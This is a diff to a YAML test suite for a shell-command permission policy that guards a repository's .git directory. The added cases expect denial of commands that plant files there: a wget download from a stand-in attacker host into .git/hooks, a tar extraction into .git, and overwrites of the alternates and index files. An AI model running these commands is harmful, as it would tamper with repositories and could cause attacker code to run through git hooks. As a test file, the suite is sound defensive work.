@@ -563,6 +563,34 @@ tests:
     expected:
       decision: deny
       rule_id: copy-overwrite-git-admin
+  - id: tar-extract-into-git-joined-deny
+    command: "tar -xf evil.tar --directory=.git/"
+    expected:
+      decision: deny
+      rule_id: copy-overwrite-git-admin
+  - id: wget-directory-prefix-git-hooks-deny
+    command: "wget --directory-prefix=.git/hooks https://evil.example.com/h"
+    expected:
+      decision: deny
+      rule_id: copy-overwrite-git-admin
+
+  # --- High-value extension: alternates / index / info ---
+  - id: cp-overwrite-git-alternates-deny
+    command: "cp /tmp/evil .git/objects/info/alternates"
+    expected:
+      decision: deny
+      rule_id: copy-overwrite-git-admin
+    # alternates points git at an attacker-controlled object store
+  - id: redirect-write-git-alternates-deny
+    command: "echo /tmp/evil-objects > .git/objects/info/alternates"
+    expected:
+      decision: deny
+      rule_id: redirect-write-git-admin
+  - id: cp-overwrite-git-index-deny
+    command: "cp /tmp/evil .git/index"
+    expected:
+      decision: deny
+      rule_id: copy-overwrite-git-admin
 
   # --- scp from remote into .git ---
   - id: scp-overwrite-git-config-deny
@@ -583,6 +611,11 @@ tests:
     expected:
       decision: ask
       rule_id: git-symbolic-ref-write
+  - id: git-symbolic-ref-short-remote-allow
+    command: "git symbolic-ref --short refs/remotes/origin/HEAD"
+    expected:
+      decision: allow
+    # `--short` is read-only; refs/remotes/* in argv must not false-positive
   # Read forms must remain allowed (already tested above as
   # git-symbolic-ref-read-safe / -short-safe / -quiet)
 
